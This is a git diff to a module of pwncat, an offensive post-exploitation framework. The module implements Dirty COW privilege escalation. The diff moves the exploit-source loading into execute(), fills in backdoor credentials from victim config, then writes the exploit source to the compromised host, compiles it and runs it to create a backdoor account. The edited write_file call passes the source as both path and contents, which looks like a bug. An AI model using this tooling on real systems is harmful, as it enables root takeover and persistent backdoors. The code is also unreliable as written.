@@ -10,6 +10,7 @@ import socket
 from io import StringIO, BytesIO
 import functools
 
+import pwncat
 from pwncat.util import CTRL_C
 from pwncat.privesc.base import Method, PrivescError, Technique
 from pwncat.file import RemoteBinaryPipe
@@ -28,16 +29,6 @@ class DirtycowMethod(Method):
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
         super(DirtycowMethod, self).__init__(pty)
         self.ran_before = False
-
-        with open("data/dirtycow/mini_dirtycow.c") as h:
-            self.dc_source = h.read()
-
-        self.dc_source = self.dc_source.replace(
-            "PWNCAT_USER", self.pty.privesc.backdoor_user_name
-        )
-        self.dc_source = self.dc_source.replace(
-            "PWNCAT_PASS", self.pty.privesc.backdoor_password
-        )
 
     def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
@@ -65,6 +56,16 @@ class DirtycowMethod(Method):
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
+        with open("data/dirtycow/mini_dirtycow.c") as h:
+            dc_source = h.read()
+
+        dc_source = dc_source.replace(
+            "PWNCAT_USER", pwncat.victim.config["backdoor_user"]
+        )
+        dc_source = dc_source.replace(
+            "PWNCAT_PASS", pwncat.victim.config["backdoor_pass"]
+        )
+
         self.ran_before = True
 
         writer = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
@@ -75,7 +76,7 @@ class DirtycowMethod(Method):
         dc_binary = self.pty.run("mktemp").decode("utf-8").strip()
 
         # Write the file
-        self.pty.run(writer.write_file(dc_source, self.dc_source))
+        self.pty.run(writer.write_file(dc_source, dc_source))
 
         # Compile Dirtycow
         self.pty.run(f"cc -pthread {dc_source_file} -o {dc_binary} -lcrypt")
